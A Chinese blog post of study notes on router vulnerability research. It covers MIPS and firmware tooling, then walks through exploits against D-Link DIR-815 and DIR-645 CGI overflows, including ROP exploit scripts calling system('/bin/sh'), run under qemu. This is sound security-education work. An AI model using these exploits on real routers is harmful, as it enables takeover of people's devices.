---
layout: post
title:  "揭秘家用路由器0day漏洞挖掘技术--读书笔记"
date:   2019-03-03 17:21:00
categories: book_note
permalink: /archivers/router_vuln_book_note
---

# 第一章 基础准备与工具

路由器漏洞分类：路由器密码破解漏洞、路由器web漏洞、路由器后门漏洞、路由器溢出漏洞。

该书分析的路由器都是基于linux系统。与普通的linux系统相比，路由器的linux系统有两个特点：一是指令架构，路由器是一种嵌入式系统，多采用MIPS和ARM；二是路由器的shell是基于BusyBox的。

## Mips 汇编基础
MIPS32寄存器分为两类：通用寄存器（GPR）和特殊寄存器。
通用寄存器：MIPS体系结构中有32个通用寄存器，汇编程序中用$0~$31表示。也可以用名称表示，如$sp、$t1、$ra等。


|    编号    | 寄存器名称 | 描述                                               |
| ---------- | -------  |                                                    |
| $0         |  $zero   | 第0号寄存器，其值始终为0。                            |
| $1         |  $at     | 保留寄存器                                          |
| $2-$3      |  $v0-$v1 | values，保存表达式或函数返回结果                      |
| $4-$7      |  $a0-$a3 | argument，作为函数的前四个参数                        |
| $8-$15     |  $t0-$t7 | temporaries，供汇编程序使用的临时寄存器                |
| $16-$23    |  $s0-$s7 | saved values，子函数使用时需先保存原寄存器的值          |
| $24-$25    |  $t8-$t9 | temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7。  |
| $26-$27    |  $k0-$k1 | 保留，中断处理函数使用                                |
| $28        |  $gp     | global pointer，全局指针                            |
| $29        |  $sp     | stack pointer，堆栈指针，指向堆栈的栈顶               |
| $30        |  $fp     | frame pointer，保存栈指针                           |
| $31        |  $ra     | return address，返回地址                            |


特殊寄存器：有3个特殊寄存器：PC（程序计数器）、HI（乘除结果高位寄存器）和LO（乘除结果低位寄存器）。在乘法时，HI保存高32位，LO保存低32位。除法时HI保存余数，LO保存商。

寻址方式：寄存器寻址、立即数寻址、寄存器相对寻址和PC相对寻址。

指令特点：
* 固定4字节指令长度。
* 内存中的数据访问（load/store）必须严格对齐。
* MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中。
* 流水线效应。MIPS采用了高度的流水线，其中一个重要的效应时分支延迟效应。

系统调用指令：SYSCALL指令是一个软中断，系统调用号存放在$v0中，参数存放在$a0-$a3中，如果参数过多，会有另一套机制，

# 第二章 必备软件和环境

软件：VMware、python、IDA pro
IDA的MIPS插件和脚本

1. `Git clone https://github.com/ray-cp/ida.git`
2. 将下载的plugins目录下所有后缀为py文件复制到ida目录的plugins下
3. 将script复制到ida目录下的scripts下
4. 完成上述步骤，将可在“edit->plugins”选项中可见

值得一提的是这些插件在ida6.7以后就无法使用了，因为api不兼容，具体可见[`http://www.hexblog.com/?p=886`](http://www.hexblog.com/?p=886)

## 安装漏洞分析环境
### binwalk安装
从固件镜像中提取文件
```C
sudo apt-get update  
sudo apt-get install build-essential autoconf git

# https://github.com/devttys0/binwalk/blob/master/INSTALL.md  
git clone https://github.com/devttys0/binwalk.git  
cd binwalk

# python2.7安装  
sudo python setup.py install

# python2.7手动安装依赖库  
sudo apt-get install python-lzma

sudo apt-get install python-crypto

sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip  
sudo pip install pyqtgraph

sudo apt-get install python-pip  
sudo pip install capstone

# Install standard extraction utilities（必选）  
sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools

# Install sasquatch to extract non-standard SquashFS images（必选）  
sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev  
git clone https://github.com/devttys0/sasquatch  
(cd sasquatch && ./build.sh)

# Install jefferson to extract JFFS2 file systems（可选）  
sudo pip install cstruct  
git clone https://github.com/sviehb/jefferson  
(cd jefferson && sudo python setup.py install)

# Install ubi_reader to extract UBIFS file systems（可选）  
sudo apt-get install liblzo2-dev python-lzo  
git clone https://github.com/jrspruitt/ubi_reader  
(cd ubi_reader && sudo python setup.py install)

# Install yaffshiv to extract YAFFS file systems（可选）  
git clone https://github.com/devttys0/yaffshiv  
(cd yaffshiv && sudo python setup.py install)

# Install unstuff (closed source) to extract StuffIt archive files（可选） 
 
wget -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz | tar -zxv  
sudo cp bin/unstuff /usr/local/bin/
```
使用命令
```C
binwalk -Me firmware.bin
```
### qemu
#### 安装
模拟器
```C
sudo apt-get install qemu
apt-get install qemu binfmt-support qemu-user-static
```
运行
```C
qemu-mips -L ../ ./ls
```
#### 基本用法qemu
主要有两种模式：

1. User Mode，亦称为使用者模式。qemu能启动那些为不同处理器编译的Linux程序。
2. System Mode，亦称为系统模式。qemu能够模拟整个计算机系统。

qemu使用者模式mips程序共有两种模拟程序，分别是运行大端机格式的qume-mips和小端机格式的qume-mipsel，他们的执行参数都是一样的。

### MIPS 交叉编译环境
buildroot是Linux平台上一个构建嵌入式Linux系统的框架。整个Buildroot是由Makefile脚本和Kconfig配置文件构成的。可以和编译Linux内核一样，通过buildroot配置，menuconfig修改，编译出一个完整的可以直接烧写到机器上运行的Linux系统软件(包含boot、kernel、rootfs以及rootfs中的各种库和应用程序)。

1. 下载buildroot
```C
wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2
tar -jxvf buildroot-snapshot.tar.bz2
cd buildroot
```
2. 配置buildroot
```C
sudo apt-get install libncurses-dev patch
make clean
make menuconfig
```
在出现界面后，选择第一项“Target Architecture”，改成MIPS（little endian），另外，选择“Toolchain”，务必将“Kernel Headers”的Linux版本改成你自己主机的Linux版本（因为我们编译出的MIPS交叉工具是需要在我们的主机上运行的）
3. 安装
```C
sudo apt-get install texinfo
sudo apt-get install bison
sudo apt-get install flex
sudo make
```
经过约一小时，编译完成后，在buildroot文件夹下多了一个output文件夹，其中就是编译好的文件，可以在buildroot/output/host/usr/bin找到生成的交叉编译工具，编译器是该目录下的mips-linux-gcc文件。
4. 配置环境变量
```C
gedit ~/.bashrc
export PATH=$PATH:/Your_Path/buildroot/output/host/usr/bin
source ~/.bashrc
```
4. 测试
```C
#include<stdio.h>

int vul(char* src)
{
    char output[20]={0};
    strcpy(output,src);
    printf("%s\n",output);
    return 0;
}
 
int main(int argc,char *argv[])
{
    if(argc<2){
        printf("need more argument\n");
        return 1;
    }
    vul(argv[1]);
    return 0;
}
```
静态编译生成二进制文件`mips-linux-gcc -o hello hello.c -static`，使用`file`查看文件类型，最终使用`qemu-mipsel hello "hello world"`测试程序。如若输出，完成安装。

## 第四章 路由器web漏洞
xss利用站点内的信任用户，跨站攻击是指入侵者在远程web页面的HTML页面中插入具有恶意代码的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面时，嵌入其中的脚本将被解释执行。

CSRF跨站请求伪造通过伪装来自受信任用户的请求达到利用受信任的网站的目的。

## 第五章 路由器后门漏洞

## 第六章 路由器溢出漏洞

MIPS32架构函数调用时对堆栈的分配和使用方式与x86架构有相似之处，但又有很大的区别。区别具体体现在：
* 栈操作：与x86架构一样，都是向低地址增长的。但是没有EBP（栈底指针），进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的栈帧存储存储区域。
* 调用：如果函数A调用函数B，调用者函数（函数A）会在自己的栈顶预留一部分空间来保存被调用者（函数B）的参数，称之为调用参数空间。
* 参数传递方式：前四个参数通过$a0-$a3传递，多余的参数会放入调用参数空间。
* 返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。

叶子函数：当前函数不再调用其他函数。
非叶子函数：当前函数调用其他函数。

函数调用的过程：父函数调用子函数时，复制当前$PC的值到$RA寄存器，然后跳到子函数执行；到子函数时，子函数如果为非叶子函数，则子函数的返回地址会先存入堆栈，否则仍在$RA寄存器中；返回时，如果子函数为叶子函数，则"jr $ra"直接返回，否则先从堆栈取出再返回。

利用堆栈溢出的可行性：在非叶子函数中，可以覆盖返回地址，劫持程序执行流程；而在非叶子函数中，可通过覆盖父函数的返回地址实现漏洞利用。

## 第七章 基于MIPS的shellcode开发

mips中可使用syscall指令来进行系统调用，调用的方法为：在使用系统调用syscall之前，$v0保存需要执行的系统调用的调用号，并且按照mips调用规则构造将要执行的系统调用参数。syscall调用的伪代码为：“syscall($v0,$a1,$a2,$a3,$a4...)”。

shellcode编码优化包括指令优化和shellcode编码。
指令优化：指令优化是指通过选择一些特殊的指令避免在shellcode中直接生成坏字符。

通常来说，shellcode可能会受到限制：首先，所有的字符串函数都会对“NULL”字节进行限制；其次，在某些处理流程中可能会限制0x0D（\r）、0x0A（\n）、或者0x20（空格）字符；最后，有些函数会要求shellcode必须为可见字符（ascii）或Unicode值。有些时候，还会受到基于特征的IDS系统对shellcode的拦截。

绕过以上限制的方法主要有两个：指令优化及shellcoe编码。后者更为通用。

shellcoe编码通常包含以下三种：base64编码、alpha_upper编码、xor编码。

## 第八章 路由器文件系统与提取

路由器漏洞的分析与利用的关键环节有获取固件、提取文件系统、漏洞分析与利用及漏洞挖掘。其中获取固件及提取文件系统是进行漏洞分析与利用的基础。

路由器固件中包含操作系统的内核及文件系统。路由器的固件不是硬件而是软件，因为在路由器中它通常是被固化在只读存储器中，所以称为固件。

在进行漏洞分析时获取路由器的固件通常有两种方式：一种是从路由器厂商提供的更新网站下载；一种是通过硬件接入，从路由器的Flash中提取固件。

### 文件系统

文件系统是操作系统的重要组成部分，是操作运行的基础。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器总是希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。

Squashfs是一个只读格式的文件系统，具有超高压缩率，可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2），在路由器中被普遍采用。

### 手动提取文件系统

文件系统中包含实现路由器各种功能的基础应用程序。文件系统能从固件中提取，而从路由器固件中提取文件系统是一个难点，原因之一在于不同的操作系统使用的文件系统不同。另外，路由器的文件系统压缩算法也有差异，有些路由器甚至会使用非标准的压缩算法打包文件系统。

手动提取文件系统类型包括：

1. 使用`file`命令查看文件系统类型。
2. 手动判断文件类型，包含如下步骤："strings|grep"检索文件系统magic签名头；“hexdump|grep”检索magic签名偏移；“dd|file”确定magic签名偏移处的文件类型。
3. 手动提取文件系统。：安装工具，`sudo apt-get install squashfs-tools`该工具目前仅支持GZIP、LZO、XZ（LZMA2）不支持LZMA格式。可以使用firmware-mod-kit解压缩，解压后得到所有文件。安装命令：
```C
git clone https://github.com/mirror/firmware-mod-kit.git
sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic
cd firmware-mod-kit
./configure && make
```

### 自动提取文件系统

binwalk是路由器固件分析的必备工具，该工具最大的优点是可以自动完成指令文件的扫描，智能发掘潜藏在文件中所有可疑地文件类型及文件系统。

binwalk&&libmagic

binwalk提取与分析过程：

1. 固件扫描。通过扫描binwalk可发现目标文件中包含的所有可识别文件类型。
```C
binwaklk firmware.bin
```
2. 提取文件。选项“-e”和“--extract”用于按照预定义的配置文件中的提取方法从固件中提取探测到的文件及系统。选项“-M”，用于递归扫描。“-d”用于递归深度的限制。
```C
binwaklk -e firmware.bin
```
3. 显示完整的扫描结果。选项“-I”或“--invalid”用于显示扫描的所有结果。
4. 指令系统分析。选项“-A”和“--opcode”用于扫描指定文件中通用cpu架构的可执行代码。
```C
binwaklk -A 70|more
```

通常binwalk可对绝大多数路由器固件进行文件提取，如遇到无法识别的固件，可向binwalk添加下列提取规则和提取方法，实现对新的文件系统进行扫描和提取：
1. 基于magic签名文件自动提取。
2. 基于binwalk配置文件的提取。
## 第九章 漏洞分析简介

漏洞分析是指在代码中迅速定位漏洞，弄清攻击原理，准确地估计潜在的漏洞利用方式和风险等级的过程。

### 漏洞分析方法

可以通过一些漏洞公布网站获取漏洞信息。网上公布的poc有很多形式，只要能触发漏洞、重现攻击过程即可。在得到poc后，就需要部署漏洞分析实验环境，利用poc重现攻击过程，定位漏洞函数，分析漏洞产生的具体原因，根据poc和漏洞情况实现对漏洞的利用。

漏洞分析中常用的两种分析方法：动态调试以及静态分析。

## 第十章 D-Link DIR-815路由器多次溢出漏洞分析

### 漏洞介绍

### 漏洞分析
下载固件: google 搜索DIR-815_FIRMWARE_1.01.ZIP。或者去官方链接下载`ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.zip`。解压缩得到固件`DIR-815 FW 1.01b14_1.01b14.bin`。

使用binwalk将固件中的文件系统提取出来。
```C 
binwalk -Me "DIR-815 FW 1.01b14_1.01b14.bin"
```
该漏洞的核心组件为`/htdocs/web/hedwig.cgi`。该组件是一个指向`/htdocs/cgibin`的符号链接。

将`/htdocs/cgibin`拖到IDA里面，漏洞公告中描述漏洞产生的原因是Cookie的值`过长`，CGI脚本中一般是通过`char *getenv("HTTP_COOKIE")`来获取cookie值，因此可在IDA中搜索字符串`"HTTP_COOKIE"`查看它的交叉引用，看是否可以找到关键函数。

看到该字符串只有一个函数引用，该函数为`sess_get_uid`，看该区域代码为：
```C
lui     $a0, 0x42
la      $t9, getenv
la      $a0, aHttpCookie  # "HTTP_COOKIE"
jalr    $t9 ; getenv
```
确实是`char *getenv("HTTP_COOKIE")`函数调用的汇编代码。再查看`sess_get_uid`函数的交叉引用，看到该函数再`hedwigcgi_main+1C0`以及`hedwigcgi_main+1C8`处有引用。跟踪到`hedwigcgi_main+1C0`的位置，看到地址`0x409680`处有个危险函数`sprintf`函数的引用，初步判断这个地方可能为栈溢出发生的地方。

cookie的形式为`uid=payload`才会被程序接受，为了验证是否是`0x409680`处的地址造成该溢出漏洞，采用动态调试进行验证。
```bash
# cgi_run.sh
# sudo ./cgi_run.sh  'uid=1234'  `python  -c "print 'uid=1234&password='+'A'*600"`

INPUT="$1"
TEST="$2"
LEN=$(echo -n "$INPUT" | wc -c)
PORT="1234"
if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi
cp $(which qemu-mipsel) ./qemu

echo "$INPUT" | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E SCRIPT_NAME="common" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$TEST -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT `/htdocs/web/hedwig.cgi` 2>/dev/null
echo "run ok"
rm -f ./qemu
```

调试步骤：

1. 使用以下命令运行`cgi_run.sh`，此时qemu运行hedwig.cgi，并等待gdb连接到端口1234
``` 
sudo ./cgi_run.sh  'uid=1234'  `python  -c "print 'uid=1234&password='+'A'*0x600"`
```
2. gdb-multiarch调试hedwig.cgi，并在可疑地址`0x409680`处以及调用获取uid的地址`0x409648`处下断。

对比`0x409680`指令前后存放$ra的区域，可以看到该内存确实被覆盖了，而且在最后程序返回时也确实可以看到崩溃了。
但是阅读汇编代码后，发现后面在`0x4096b4`处以写的形式打开了`/var/tmp/temp.xml`文件，对固件目录进行检查时发现，`/var`目录是空的，不存在`/var/tmp/`目录。

由于我没有实体固件路由器，所以无法确定真实环境中是否有该目录，因此只能根据书中的描述来认为该环境中确实存在该目录，并在`/var`目录下创建了`/tmp`目录以尽可能的模拟真实环境。

继续阅读汇编代码，发现并不是只有`0x409680`处调用了`sprintf`函数，在`0x40997C`处也调用了该函数。

再回头去看一遍函数流程，可以得到再`0x409680`处调用了`sprintf`函数形成栈溢出，后续创建`/var/tmp/temp.xml`，如果创建失败的话，程序返回；如果创建成功，会继续执行且在`0x40997C`处再次调用`sprintf`函数再次形成栈溢出。

因此真实环境中，会形成两次栈溢出且栈的最后状态由第二次溢出也就是`0x40997C`处的栈溢出决定，所以一不小心就会造成误判。

漏洞利用的步骤为：

1. 确定缓冲区大小，控制偏移以实现对PC的劫持。
2. 编写代码，通过qemu虚拟机调试验证。
3. 确定攻击路径，构造ROP。
4. 构建利用攻击数据，编写exp。

首先是第一步，缓冲区大小判定，可以使用创建模式字符串去调试确认，但是我都是通过IDA静态分析确定的。在IDA中对缓冲区位置以及存储$ra的地址进行查看，根据公式得到偏移为：
```C
offset=saved_ra-buf_addr=-0x4-0x428=0x424
```
同时我们知道`sprintf`函数的函数声明是`sprintf(char *str, char *format, ...)`，找到对应的参数第二个参数format是`htdocs/webinc/fatlady.php\nprefix=%s/%s`，第二个参数是`/runtime/session`，第三个参数是我们可控的`cookie`，因此需要达到控制PC的输入长度为：
```C
offset=0x424-len("/htdocs/webinc/fatlady.php\nprefix=/runtime/session/")
offset=0x3f1
```

第二步，动态确认。在调试之前，首先要创建`/var/tmp/`目录，开始调试时在溢出地址`0x40997C`处以及返回地址`0x409A28`下断。使用命令
```C
sudo ./cgi_run.sh  'uid=1234'  `python  -c "print 'uid='+'A'*0x3f2+'B'*0x4"
```
来启动程序，并使用gdb-multiarch加载程序进行调试，可以看到在`sprintf`后存储$ra内存区域被覆盖为了0x42424242，即我们已成功控制PC，验证成功。

第三步，确定攻击路径，构造ROP。查看hedwig_main函数返回处的汇编指令，知道了溢出数据可导致$ra、$fp、$s7、$s6、$s5、$s4、$s3、$s2、$s1、$s0等寄存器可控。
```C
lw      $ra, 0x4E8+var_4($sp)
move    $v0, $s7
lw      $fp, 0x4E8+var_8($sp)
lw      $s7, 0x4E8+var_C($sp)
lw      $s6, 0x4E8+var_10($sp)
lw      $s5, 0x4E8+var_14($sp)
lw      $s4, 0x4E8+var_18($sp)
lw      $s3, 0x4E8+var_1C($sp)
lw      $s2, 0x4E8+var_20($sp)
lw      $s1, 0x4E8+var_24($sp)
lw      $s0, 0x4E8+var_28($sp)
jr      $ra
```
构造ROP首先是要找到`system`函数地址，将`libc.so.0`拖进`ida`并搜索函数`system`得到地址偏移为`0x53200`。

找到该函数后，我们需要寻找到可以调用该函数的gadget。这时候`MIPSROP`就派上用场了。
使用命令`mipsrop.stackfinder()`寻找相应的把栈里面的数据扔到寄存器的指令，找到一条指令如下：
```C
python>mipsrop.stackfinder()
------------------------------------------------------------------
|  Address     |  Action                     |  Control Jump      |
------------------------------------------------------------------
|  0x000159CC  |  addiu $s5,$sp,0x170+var_160|  jalr  $s0         |

.text:000159CC                 addiu   $s5, $sp, 0x170+var_160
.text:000159D0                 move    $a1, $s3
.text:000159D4                 move    $a2, $s1
.text:000159D8                 move    $t9, $s0
.text:000159DC                 jalr    $t9 ; 
.text:000159E0                 move    $a0, $s5
```
可以看到这条指令把\$sp+0x10地址存入\$s5中，并在`0x159E0`处将\$s5寄存器的值作为参数传递给\$a0，并且将\$s0中的值作为地址进行调用，因此只需将\$s0中的值赋值为system函数的地址，并将\$sp+0x10地址赋值为需要执行的命令即可实现`system('command')`的函数调用。又因为前面提过\$s0寄存器可控，所以现在从理论上来说已经实现了ROP完整攻击的设计。

书上提到过一个问题，即libc.so.0库的基址为0x2aaf8000，而system的偏移为`0x53200`，二者相加的system函数地址`0x2ab4b200`的末位仍然是`\x00`，会使得sprintf函数截断字符串导致攻击失败。

解决办法为：首先将\$s0覆盖为目标地址附近的不包含`\x00`的地址，然后在libc中搜索指令，通过对\$s0进行加减操作，将该寄存器中的值改变为需要的地址。

具体来说实现如下：将\$s0的地址覆盖为`0x2ab4b1ff`，然后在libc中搜索一条指令对$s0进行操作，再跳转到`call system`指令，搜索指令的命令为`mipsrop.find('addiu $s0,1')`。
```c
Python>mipsrop.find('addiu $s0,1')
-------------------------------------------------------------------
|  Address     |  Action              |  Control Jump             |
-------------------------------------------------------------------
|  0x000158C8  |  addiu $s0,1         |  jalr  $s5                |
```

所以完整的ROP链为`0x000158C8 --> 0x159CC `

完整exp如下：

```PYTHON
from pwn import *

system_addr=0x76738000+0x53200
gadget1=0x76738000+0x000158C8
gadget2=0x76738000+0x000159CC 
addr=0x76fff218-0x300
f=open("payload","wb")
data='uid='
data+='A'*(0x3f1-0x24)+p32(system_addr-1)+p32(addr)*4+p32(gadget2)+p32(addr)*2+p32(addr)+p32(gadget1)+p32(addr)*4+'/bin/sh\x00'
f.write(data)
f.close()
```
```C
#!/bin/bash
# cgi_run.sh
# sudo ./cgi_run.sh `

python generate.py
INPUT=$(<payload)

LEN=$(echo $INPUT | wc -c)
PORT="1234"

echo $LEN
echo 123
echo $INPUT
echo $UID

if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$INPUT -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/hedwig.cgi #2>/dev/null
echo "run ok"
rm -f ./qemu
```

不晓得为什么没有得到shell。都执行system('/bin/sh')了。不知道是不是必须要在真实路由器上面跑啊。。。。。先放这里，后面再回来看。

## 第11章 D-Link DIR-645路由器溢出漏洞分析

### 漏洞分析

漏洞是CGI脚本authentiction.cgi在读取POST参数中“password”参数的值时可造成缓冲区溢出。下载固件DIR—645\_FIRMWARE\_1.03.ZIP，链接是[ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP](ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP)。

binwalk 解压固件提取出文件系统。
```C
binwalk -Me dir645_FW_103.bin
```

漏洞的核心组件是`./htdocs/web/authentication.cgi`，file查看得到
```C
file ./htdocs/web/authentication.cgi 
./htdocs/web/authentication.cgi: broken symbolic link to /htdocs/cgibin
```
真正的漏洞在cgibin中。

直接使用poc，对程序进行测试。
```bash
#!/bin/bash
# cgi_run.sh
# sudo ./cgi_run.sh `python -c  "print 'uid=1234&password='+'A'*0x600"` "uid=1234"

INPUT="$1"
TEST="$2"

LEN=$(echo -n $INPUT | wc -c)
PORT="1234"


if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E REQUEST_METHOD="POST"  -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi 2>/dev/null
echo "run ok"
rm -f ./qemu
```
gdb中在`authenticationcgi_main`入口处`0x40B028`下断，单步跟踪，发现在地址`0x40B500`处的read函数处覆盖率saved_ra，为了避免遇到与前一章相同的二次溢出的问题，继续单步下去。

发现在`0x40b514`处调用函数`0x40a424`处报错，重新调试，并在该地址下断点。跟进去该函数。单步跟下去，发现是在地址`0x40A494`处出错，并且报错信息为：
```C
   0x7676c8a0 <memcmp+16>    lbu    $v0, ($a1)
   0x7676c8a4 <memcmp+20>    addiu  $a0, $a0, 1
   0x7676c8a8 <memcmp+24>    subu   $v0, $v1, $v0

i r $a1
a1: 0x41414141
```
可以看到\$a1被覆盖为了0x41414141，从而导致访存错误。

尝试减小字符串，来查看是否仍然会崩溃。使用以下payload发现可成功控制pc，因此可确定导致溢出的原因为`0x40B500`处的read函数。
```c
sudo ./cgi_run.sh `python -c "print 'uid=1234&password='+'A'*1160"` "uid=1234"
```

阅读汇编代码，发现该处的read函数调用为：
```C
read( fileno(stdin), var_430, atoi(getenv("CONTENT_LENGTH")));
```
所以很容易看到溢出的原理是没有对`CONTENT_LENGTH`进行限制，而缓冲区空间有限，导致溢出。

对后面的代码分析，发现在`0x40B550`处其要求参数的值必须包括`id=`以及`password=`，否则会提前报错，因此可构造exp。

### 漏洞利用

从IDA中可以得到覆盖pc的字符串偏移为：
```c
offset=-0x4-0x430=0x42c
len=0x42c-len('uid=1234&password=')=1050
```
进行测试，发现刚好覆盖saved_ra：
```c
sudo ./cgi_run.sh `python -c "print 'uid=1234&password='+'A'*1050+'B'*4"` "uid=1234"
```

可使用与上一章相同的gadget来实现ROP。

ulibc中system地址为`0x53200`，mipsrop寻找gadget为：
```C
python>mipsrop.stackfinder()
------------------------------------------------------------------
|  Address     |  Action                     |  Control Jump      |
------------------------------------------------------------------
|  0x000159CC  |  addiu $s5,$sp,0x170+var_160|  jalr  $s0         |

.text:000159CC                 addiu   $s5, $sp, 0x170+var_160
.text:000159D0                 move    $a1, $s3
.text:000159D4                 move    $a2, $s1
.text:000159D8                 move    $t9, $s0
.text:000159DC                 jalr    $t9 ; 
.text:000159E0                 move    $a0, $s5
```
因此完整exp为：
```PYTHON
from pwn import *

system_addr=0x76738000+0x53200
gadget=0x76738000+0x000159CC 
f=open("payload","wb")
data='uid=1234&password='
data+='A'*(1050-0x24)+p32(system_addr)+'A'*0x20+p32(gadget)+'A'*0x10+'/bin/sh\x00'
f.write(data)
f.close()
```
```C
#!/bin/bash
# cgi_run.sh
# sudo ./cgi_run.sh `

python generate.py
INPUT=$(<payload)

LEN=$(echo $INPUT | wc -c)
PORT="1234"


if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencodede" -E REQUEST_METHOD="POST"  -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi 2>/dev/null
rm -f ./qemu
```

## 第十二章 D-Link DIR-505便携路由器越界漏洞分析

### 漏洞分析

固件下载地址：[ftp://ftp2.dlink.com/PRODUCTS/DIR-505/REVA/DIR-505_FIRMWARE_1.08B10.ZIP](ftp://ftp2.dlink.com/PRODUCTS/DIR-505/REVA/DIR-505_FIRMWARE_1.08B10.ZIP)

漏洞存在于名为“my_cgi.cgi”的cgi脚本中。下载固件，binwalk解压出来，找到该漏洞的核心组件`usr/bin/my_cgi.cgi`，直接使用poc对代码进行调试。
```C
#!/bin/bash
# cgi_run.sh
# sudo ./cgi_run.sh

python generate.py
INPUT=`python -c "print 'storage_path='+'B'*477472+'A'*4"`

LEN=$(echo $INPUT | wc -c)
PORT="1234"


if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nusage: sudo $0\n"
    exit 1
fi

cp $(which qemu-mipsel-static) ./qemu

echo "$INPUT"  | chroot .  ./qemu  -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="multipart/formdata" -E SCRIPT_NAME="common"  -E REQUEST_METHOD="POST"  -E REQUEST_URI="/my_cgi.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /usr/bin/my_cgi.cgi 2>/dev/null
echo "run ok"
rm -f ./qemu
```

问题发生在post参数`storage_path`，所以在ida中搜索字符串找到该字符串并查看交叉引用，发现有好几个。

有一个叫`get_input_entries`函数，从字面上理解可能为获取输入，为可疑溢出点，查看该函数。在该函数下断点，并通过动静态分析，发现其确实为输入处理的地方，使用了一个for循环将数据存入main函数传入的栈中。

通过对调用函数main函数的分析发现，漏洞产生的原因在于没有对`CONTENT_LENTGTH`进行长度的检查导致栈溢出。

### 漏洞利用

该文件中存在system函数以及system函数的调用，经查看，发现地址`0x405B24`的代码刚好可以满足我们的需要：
```C
.text:00405B1C                 la      $t9, system
.text:00405B20                 li      $s1, 0x440000
.text:00405B24                 jalr    $t9 ; system
.text:00405B28                 addiu   $a0, $sp, 0x78+var_50  # command
```
所以构造好exp即可。

## 第十三章   Linksys WRT54G路由器溢出漏洞分析--运行环境修复

### 漏洞分析

下载链接[https://download.pchome.net/driver/network/route/wireless/down-129948-2.html](https://download.pchome.net/driver/network/route/wireless/down-129948-2.html)




漏洞的核心组件是`/usr/sbin/httpd`

```C
cp $(which qemu-mipsel-static) ./qemu
sudo chroot . ./qemu /usr/sbin/httpd -g 1234
netstat -ntlp|grep 80
```
路由器运行时会去 nvram中获取配置信息，而我们的qemu中是没有该设备，路由器中的程序可能会因为没法获取配置信息而退出。
https://github.com/zcutlip/nvram-faker


```C
char *get_mac_from_ip(const char *ip)
{
    char mac[]="00:50:56:C0:00:08";
    char *rmac=strdup(mac);
    return rmac;
}

int fork(void)
{
    return 0;
}

int fork(void);
char *get_mac_from_ip(const char *ip);
```

`cp ~/Desktop/buildroot/output/target/lib/libgcc_s.so.1 ./lib/`


prepare.sh
```bash
rm var
mkdir var
mkdir ./var/run
mkdir ./var/tmp
touch ./var/run/lock
touch ./var/run/crod.pid
touch httpd.pid
```

cgi_run_poc.sh
```C
#!/bin/bash
# cgi_run.sh
# sudo ./cgi_run.sh

DEBUG=$1

LEN=$(echo $DEBUG | wc -c)
PORT="1234"


#if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
#then
#    echo -e "\nusage: sudo $0\n"
#    exit 1
#fi

cp $(which qemu-mipsel-static) ./qemu

if [ "$LEN" -eq 1 ]
then 
    echo "EXECUTE MODE\n"
    sudo chroot . ./qemu -E LD_PRELOAD="/libnvram-faker.so" ./usr/sbin/httpd
else
    echo "DEBUG MODE\n"
    sudo chroot . ./qemu -E LD_PRELOAD="/libnvram-faker.so" -g 1234 ./usr/sbin/httpd
fi
echo "run ok"
rm -f ./qemu
```

## 第十七章 路由器漏洞挖掘技术

